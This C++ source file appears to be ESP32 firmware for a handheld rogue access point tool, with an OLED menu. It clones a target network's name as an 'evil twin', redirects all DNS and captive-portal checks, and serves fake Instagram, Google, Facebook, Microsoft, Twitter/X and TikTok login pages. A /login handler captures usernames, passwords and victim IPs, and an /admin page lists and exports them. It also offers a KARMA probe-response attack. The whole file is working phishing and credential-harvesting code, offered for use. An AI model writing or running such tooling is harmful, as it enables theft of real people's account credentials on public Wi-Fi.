#include "rogue_ap.h"
#include "config.h"
#include "utils.h"
#include "icons.h"
#include "credentials.h"
#include "phishing_pages.h"
#include "menu.h"
#include "pins.h"
#include <U8g2lib.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <WiFi.h>
#include <SPIFFS.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern DNSServer dnsServer;
extern CapturedCredential capturedCreds[];
extern int credCount;
extern String loginPages[7];

WebServer rogueWebServer(80);

RogueAPConfig currentConfig;
bool rogueAPActive = false;
int rogueMenu = 0;
String selectedSSID = "";
bool inScanMenu = false;
int scanMenuOffset = 0;
bool inPageSelectMenu = false;
int pageSelectIndex = 0;

const char* pageNames[] = {
    "📸 Instagram",
    "🔍 Google",
    "👤 Facebook",
    "💻 Microsoft",
    "🐦 Twitter/X",
    "🎵 TikTok",
    "🔧 Custom"
};

String getRogueAdminPage() {
    String page = R"rawliteral(
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Phishing</title>
<style>
body{font-family:monospace;background:#000;color:#0f0;padding:20px}
table{width:100%;border-collapse:collapse;margin:10px 0}
th,td{border:1px solid #0f0;padding:6px;text-align:left}
th{background:#0f0;color:#000}
button{background:#0f0;color:#000;border:none;padding:8px 16px;margin:4px;cursor:pointer}
.danger{background:#f44;color:#fff}
</style>
</head><body>
<h1>🔑 CREDENTIALS</h1>
<div>Captured: )rawliteral";
    page += String(credCount);
    page += R"rawliteral( | Clients: )rawliteral";
    page += String(WiFi.softAPgetStationNum());
    page += R"rawliteral( | Template: )rawliteral";
    page += String(pageNames[currentConfig.templateType]);
    page += R"rawliteral(</div>)rawliteral";
    if(credCount > 0) {
        page += "<table><tr><th>#</th><th>User</th><th>Pass</th><th>Type</th><th>IP</th></tr>";
        for(int i = 0; i < credCount; i++) {
            page += "<tr><td>" + String(i+1) + "</td><td>" + capturedCreds[i].username + "</td><td>" + capturedCreds[i].password + "</td><td>" + capturedCreds[i].type + "</td><td>" + capturedCreds[i].ip + "</td></tr>";
        }
        page += "</table>";
    }
    page += R"rawliteral(
<div style="margin-top:15px;">
<button onclick="fetch('/clear').then(()=>location.reload())">Clear</button>
<button onclick="fetch('/stop').then(()=>location.reload())" class="danger">Stop</button>
<button onclick="fetch('/reboot')">Reboot</button>
<button onclick="fetch('/export')">Export CSV</button>
</div>
</body></html>
)rawliteral";
    return page;
}

void startRogueAP(RogueAPConfig config) {
    if(rogueAPActive) {
        showPopupMessage("⏹️ Stopping existing AP...");
        stopRogueAP();
        delay(500);
    }
    
    showPopupMessage("📡 Starting AP...", config.ssid.c_str());
    
    currentConfig = config;
    if(loginPages[0].length() == 0) initPhishingPages();
    loadCredentials();
    clearPopup();
    
    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(200);
    
    WiFi.mode(WIFI_AP);
    delay(100);
    
    int channel = config.channel;
    if(channel < 1 || channel > 13) channel = 6;
    
    if(config.enableWPA2 && config.wpaPassword.length() >= 8) {
        WiFi.softAP(config.ssid.c_str(), config.wpaPassword.c_str(), channel, 0, 1);
    } else {
        WiFi.softAP(config.ssid.c_str(), NULL, channel, 0, 1);
    }
    delay(100);
    
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    delay(100);
    
    dnsServer.stop();
    delay(50);
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    
    rogueWebServer.stop();
    delay(100);
    
    rogueWebServer.on("/", []() {
        rogueWebServer.send(200, "text/html", loginPages[currentConfig.templateType]);
    });
    
    rogueWebServer.on("/login", HTTP_POST, []() {
        String username = "", password = "";
        String clientIP = rogueWebServer.client().remoteIP().toString();
        String types[] = {"Instagram", "Google", "Facebook", "Microsoft", "Twitter/X", "TikTok", "Custom"};
        
        if (rogueWebServer.hasArg("username")) {
            username = rogueWebServer.arg("username");
        } else if (rogueWebServer.hasArg("user")) {
            username = rogueWebServer.arg("user");
        } else if (rogueWebServer.hasArg("email")) {
            username = rogueWebServer.arg("email");
        } else if (rogueWebServer.hasArg("login")) {
            username = rogueWebServer.arg("login");
        } else if (rogueWebServer.hasArg("userid")) {
            username = rogueWebServer.arg("userid");
        } else if (rogueWebServer.hasArg("phone")) {
            username = rogueWebServer.arg("phone");
        } else if (rogueWebServer.hasArg("mail")) {
            username = rogueWebServer.arg("mail");
        }
        
        if (rogueWebServer.hasArg("password")) {
            password = rogueWebServer.arg("password");
        } else if (rogueWebServer.hasArg("pass")) {
            password = rogueWebServer.arg("pass");
        } else if (rogueWebServer.hasArg("pwd")) {
            password = rogueWebServer.arg("pwd");
        } else if (rogueWebServer.hasArg("pw")) {
            password = rogueWebServer.arg("pw");
        }
        
        Serial.println("\n📥 ROGUE AP LOGIN ATTEMPT");
        Serial.printf("  Username: %s\n", username.c_str());
        Serial.printf("  Password: %s\n", password.c_str());
        Serial.printf("  IP: %s\n", clientIP.c_str());
        
        for (int i = 0; i < rogueWebServer.args(); i++) {
            Serial.printf("  Arg %d: %s = %s\n", i, rogueWebServer.argName(i).c_str(), rogueWebServer.arg(i).c_str());
        }
        
        if (username.length() > 0 && password.length() > 0) {
            addCredential(username, password, clientIP, types[currentConfig.templateType]);
            Serial.printf("✅ Credential saved! Total: %d\n", credCount);
            
            // ✅ FIXED: Added .c_str() to convert String to const char*
            showCredentialPopup(username.c_str(), password.c_str(), clientIP.c_str(), types[currentConfig.templateType].c_str());
            
            String success = R"rawliteral(
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta http-equiv="refresh" content="2;url=/"></head>
<body style="font-family:sans-serif;text-align:center;padding:50px;background:#fafafa">
<h2 style="color:#1877f2;">✅ Login Successful!</h2>
<p>Redirecting...</p>
</body></html>
)rawliteral";
            rogueWebServer.send(200, "text/html", success);
        } else {
            Serial.println("❌ Missing fields - username or password empty");
            rogueWebServer.send(400, "text/plain", "Missing fields");
        }
    });
    
    rogueWebServer.on("/admin", []() {
        rogueWebServer.send(200, "text/html", getRogueAdminPage());
    });
    
    rogueWebServer.on("/clear", []() {
        clearCredentials();
        rogueWebServer.send(200, "text/plain", "Cleared");
        showPopupMessage("🗑️ Credentials Cleared", String(credCount).c_str());
    });
    
    rogueWebServer.on("/stop", []() {
        rogueWebServer.send(200, "text/plain", "Stopping...");
        stopRogueAP();
    });
    
    rogueWebServer.on("/reboot", []() {
        rogueWebServer.send(200, "text/plain", "Rebooting...");
        delay(500);
        ESP.restart();
    });
    
    rogueWebServer.on("/export", []() {
        exportCredentials();
        rogueWebServer.send(200, "text/plain", "Exported to Serial");
        showPopupMessage("📤 Exported to Serial", String(credCount).c_str());
    });
    
    rogueWebServer.on("/scan", []() {
        rogueWebServer.send(200, "text/plain", "Scanning...");
        scanNetworks();
    });
    
    rogueWebServer.on("/generate_204", []() {
        rogueWebServer.sendHeader("Location", "/", true);
        rogueWebServer.send(302, "text/plain", "");
    });
    rogueWebServer.on("/hotspot-detect.html", []() {
        rogueWebServer.sendHeader("Location", "/", true);
        rogueWebServer.send(302, "text/plain", "");
    });
    rogueWebServer.on("/connecttest.txt", []() {
        rogueWebServer.sendHeader("Location", "/", true);
        rogueWebServer.send(302, "text/plain", "");
    });
    rogueWebServer.on("/ncsi.txt", []() {
        rogueWebServer.sendHeader("Location", "/", true);
        rogueWebServer.send(302, "text/plain", "");
    });
    rogueWebServer.on("/favicon.ico", []() {
        rogueWebServer.send(200, "text/plain", "");
    });
    
    rogueWebServer.onNotFound([]() {
        rogueWebServer.sendHeader("Location", "/", true);
        rogueWebServer.send(302, "text/plain", "");
    });
    
    rogueWebServer.begin();
    rogueAPActive = true;
    
    Serial.println("\n✅ ROGUE AP RUNNING!");
    Serial.printf("📡 SSID: %s\n", config.ssid.c_str());
    Serial.printf("📡 Channel: %d\n", channel);
    if(config.enableWPA2) {
        Serial.printf("🔐 WPA2 Password: %s\n", config.wpaPassword.c_str());
    }
    Serial.printf("🌐 IP: %s\n", WiFi.softAPIP().toString().c_str());
    Serial.printf("📱 Admin: http://%s/admin\n", WiFi.softAPIP().toString().c_str());
    Serial.printf("📊 Page: %s\n", pageNames[currentConfig.templateType]);
    
    String ipStr = WiFi.softAPIP().toString();
    showPopupMessage("✅ AP RUNNING!", config.ssid.c_str(), ipStr.c_str());
    delay(1500);
}

void stopRogueAP() {
    if(rogueAPActive) {
        showPopupMessage("⏹️ Stopping AP...");
        
        rogueWebServer.stop();
        Serial.println("  ✅ Web server stopped");
        
        dnsServer.stop();
        Serial.println("  ✅ DNS stopped");
        
        WiFi.softAPdisconnect(true);
        Serial.println("  ✅ AP disconnected");
        
        WiFi.mode(WIFI_OFF);
        Serial.println("  ✅ WiFi OFF");
        
        rogueAPActive = false;
        clearPopup();
        Serial.println("⏹️ Rogue AP stopped");
        
        showPopupMessage("⏹️ AP Stopped", "Rogue AP is now offline");
        delay(1000);
    } else {
        showPopupMessage("ℹ️ AP Not Running", "No AP to stop");
        delay(800);
    }
}

void scanNetworks() {
    showPopupMessage("📡 Scanning...", "Looking for networks");
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    int n = WiFi.scanNetworks();
    
    if(n > 0) {
        Serial.printf("📡 Scanned %d networks\n", n);
        String result = String(n) + " networks found";
        showPopupMessage("✅ Scan Complete", result.c_str());
        
        for(int i = 0; i < n && i < 10; i++) {
            String ssid = WiFi.SSID(i);
            if(ssid.length() == 0) ssid = "<Hidden>";
            Serial.printf("  %d. %s (Ch%d, %ddBm)\n", i+1, ssid.c_str(), WiFi.channel(i), WiFi.RSSI(i));
        }
        delay(1200);
    } else {
        Serial.println("📡 No networks found");
        showPopupMessage("❌ No Networks", "Nothing found nearby");
        delay(1200);
    }
    WiFi.mode(WIFI_OFF);
}

void selectTargetNetwork(String ssid) {
    selectedSSID = ssid;
    Serial.printf("🎯 Selected target: %s\n", ssid.c_str());
    
    String lowerSSID = ssid;
    lowerSSID.toLowerCase();
    if(lowerSSID.indexOf("instagram") != -1 || lowerSSID.indexOf("insta") != -1) {
        currentConfig.templateType = PHISH_INSTAGRAM;
    } else if(lowerSSID.indexOf("google") != -1) {
        currentConfig.templateType = PHISH_GOOGLE;
    } else if(lowerSSID.indexOf("facebook") != -1 || lowerSSID.indexOf("fb") != -1) {
        currentConfig.templateType = PHISH_FACEBOOK;
    } else if(lowerSSID.indexOf("microsoft") != -1 || lowerSSID.indexOf("ms") != -1) {
        currentConfig.templateType = PHISH_MICROSOFT;
    } else if(lowerSSID.indexOf("twitter") != -1 || lowerSSID.indexOf("x") != -1) {
        currentConfig.templateType = PHISH_TWITTER;
    } else if(lowerSSID.indexOf("tiktok") != -1) {
        currentConfig.templateType = PHISH_TIKTOK;
    } else {
        currentConfig.templateType = PHISH_CUSTOM;
    }
    currentConfig.ssid = ssid;
    currentConfig.channel = 6;
    
    String pageName = pageNames[currentConfig.templateType];
    showPopupMessage("🎯 Target Selected", ssid.c_str(), pageName.c_str());
    delay(1200);
}

void cloneTargetNetwork() {
    if(selectedSSID.length() > 0) {
        currentConfig.ssid = selectedSSID;
        currentConfig.channel = 6;
        currentConfig.useClonedMAC = true;
        Serial.printf("🔄 Cloned: %s on channel %d\n", 
                     selectedSSID.c_str(), currentConfig.channel);
        showPopupMessage("🔄 Cloned Network", selectedSSID.c_str());
        delay(1000);
    } else {
        Serial.println("❌ No target selected to clone");
        showPopupMessage("❌ No Target", "Select a network first");
        delay(1000);
    }
}

void enableEvilTwin(String targetSSID) {
    selectTargetNetwork(targetSSID);
    currentConfig.useEvilTwin = true;
    currentConfig.preserveOriginal = true;
    startRogueAP(currentConfig);
    Serial.printf("👹 Evil Twin running as: %s\n", targetSSID.c_str());
}

void enableKarmaAttack() {
    currentConfig.enableKarma = true;
    currentConfig.enableProbeResponse = true;
    Serial.println("👻 KARMA attack enabled - responding to all probes");
    showPopupMessage("👻 KARMA Enabled", "Responding to all probes");
    delay(1000);
}

void rogueAPSetup() {
    if(loginPages[0].length() == 0) initPhishingPages();
    loadCredentials();
    rogueAPActive = false;
    clearPopup();
    
    currentConfig = RogueAPConfig();
    currentConfig.ssid = "Free_WiFi";
    currentConfig.templateType = PHISH_INSTAGRAM;
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawXBMP(56, 5, 16, 16, icon_phishing);
    CenteredStr(15, "Rogue AP");
    char credStr[32];
    sprintf(credStr, "Saved: %d", credCount);
    CenteredStr(28, credStr);
    CenteredStr(42, "SELECT: Menu");
    CenteredStr(55, "UP/DN: Navigate");
    u8g2.sendBuffer();
    
    Serial.println("🔱 Rogue AP initialized");
}

void rogueAPLoop() {
    const char* mainItems[] = {
        "📡 Scan Networks",
        "🎯 Select Target",
        "🔄 Clone Network",
        "👹 Evil Twin",
        "📄 Select Page",
        "🔑 Start AP",
        "⏹️ Stop AP",
        "👻 KARMA Attack",
        "📤 Export Creds",
        "🗑️ Clear Creds",
        "⬅️ Back"
    };
    int mainCount = 11;
    
    if (drawPopupIfActive()) {
        delay(50);
        return;
    }
    
    if(isButtonPressed(BTN_BACK)) {
        if(rogueAPActive) stopRogueAP();
        exitModule();
        return;
    }
    
    if(inPageSelectMenu) {
        drawScrollingMenu(pageNames, 7, pageSelectIndex, 4, "Select Login Page", 1);
        
        if(isButtonPressed(BTN_UP)) {
            pageSelectIndex = (pageSelectIndex - 1 + 7) % 7;
        }
        if(isButtonPressed(BTN_DOWN)) {
            pageSelectIndex = (pageSelectIndex + 1) % 7;
        }
        if(isButtonPressed(BTN_SELECT)) {
            currentConfig.templateType = (PhishingTemplate)pageSelectIndex;
            Serial.printf("📄 Selected page: %s\n", pageNames[pageSelectIndex]);
            inPageSelectMenu = false;
            rogueMenu = 0;
            u8g2.clearBuffer();
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.drawXBMP(56, 5, 16, 16, icon_phishing);
            CenteredStr(30, pageNames[pageSelectIndex]);
            CenteredStr(45, "Selected!");
            u8g2.sendBuffer();
            delay(800);
        }
        if(isButtonPressed(BTN_BACK)) {
            inPageSelectMenu = false;
            rogueMenu = 0;
        }
        return;
    }
    
    if(inScanMenu) {
        int n = WiFi.scanComplete();
        if(n > 0) {
            int displayCount = min(4, n);
            String scanItems[8];
            
            for(int i = 0; i < displayCount && i < 8; i++) {
                int idx = scanMenuOffset + i;
                if(idx < n) {
                    String ssid = WiFi.SSID(idx);
                    if(ssid.length() == 0) ssid = "<Hidden>";
                    if(ssid.length() > 18) ssid = ssid.substring(0, 16) + "...";
                    String item = ssid + " " + String(WiFi.RSSI(idx)) + "dBm";
                    if(WiFi.encryptionType(idx) == WIFI_AUTH_OPEN) item += " 🔓";
                    scanItems[i] = item;
                }
            }
            
            scanItems[displayCount] = "--- Select to choose ---";
            scanItems[displayCount + 1] = "⬅️ Back to menu";
            int totalItems = displayCount + 2;
            
            const char* scanMenuPtrs[8];
            for(int i = 0; i < totalItems && i < 8; i++) {
                scanMenuPtrs[i] = scanItems[i].c_str();
            }
            
            drawScrollingMenu(scanMenuPtrs, totalItems, rogueMenu, 4, "Networks", 1);
            
            if(isButtonPressed(BTN_UP)) {
                if(rogueMenu > 0) rogueMenu--;
            }
            if(isButtonPressed(BTN_DOWN)) {
                if(rogueMenu < totalItems - 1) rogueMenu++;
            }
            
            if(isButtonPressed(BTN_SELECT)) {
                if(rogueMenu < displayCount && n > 0) {
                    int idx = scanMenuOffset + rogueMenu;
                    if(idx < n) {
                        String ssid = WiFi.SSID(idx);
                        if(ssid.length() == 0) ssid = "<Hidden>";
                        selectTargetNetwork(ssid);
                        inScanMenu = false;
                        rogueMenu = 0;
                        WiFi.scanDelete();
                    }
                } else if(rogueMenu == displayCount + 1) {
                    inScanMenu = false;
                    rogueMenu = 0;
                    WiFi.scanDelete();
                }
            }
        } else {
            inScanMenu = false;
            rogueMenu = 0;
        }
        return;
    }
    
    drawScrollingMenu(mainItems, mainCount, rogueMenu, 4, "Rogue AP", 1);
    
    if(isButtonPressed(BTN_UP)) {
        rogueMenu = (rogueMenu - 1 + mainCount) % mainCount;
    }
    if(isButtonPressed(BTN_DOWN)) {
        rogueMenu = (rogueMenu + 1) % mainCount;
    }
    
    if(isButtonPressed(BTN_SELECT)) {
        switch(rogueMenu) {
            case 0:
                scanNetworks(); 
                break;
            case 1:
                if(WiFi.scanComplete() <= 0) {
                    scanNetworks();
                }
                inScanMenu = true;
                rogueMenu = 0;
                scanMenuOffset = 0;
                break;
            case 2:
                cloneTargetNetwork(); 
                break;
            case 3:
                if(selectedSSID.length() > 0) {
                    enableEvilTwin(selectedSSID);
                } else {
                    Serial.println("❌ No target selected");
                    showPopupMessage("❌ No Target", "Select a network first");
                    delay(1000);
                }
                break;
            case 4:
                inPageSelectMenu = true;
                pageSelectIndex = currentConfig.templateType;
                rogueMenu = 0;
                break;
            case 5:
                if(currentConfig.ssid.length() > 0) {
                    startRogueAP(currentConfig);
                } else {
                    Serial.println("❌ No SSID configured");
                    showPopupMessage("❌ No SSID", "Configure SSID first");
                    delay(1000);
                }
                break;
            case 6:
                stopRogueAP(); 
                break;
            case 7:
                enableKarmaAttack(); 
                break;
            case 8:
                exportCredentials(); 
                break;
            case 9:
                clearCredentials(); 
                break;
            case 10:
                exitModule(); 
                return;
        }
    }
    
    if(rogueAPActive) {
        dnsServer.processNextRequest();
        rogueWebServer.handleClient();
    }
    
    delay(10);
}

void rogueAPCleanup() {
    Serial.println("🧹 Rogue AP cleanup...");
    unsigned long startTime = millis();
    
    if (rogueAPActive) {
        stopRogueAP();
        delay(100);
    }
    
    rogueWebServer.stop();
    dnsServer.stop();
    
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    
    rogueAPActive = false;
    inScanMenu = false;
    inPageSelectMenu = false;
    rogueMenu = 0;
    scanMenuOffset = 0;
    selectedSSID = "";
    pageSelectIndex = 0;
    clearPopup();
    
    Serial.printf("✅ Rogue AP cleanup complete (%lu ms)\n", millis() - startTime);
}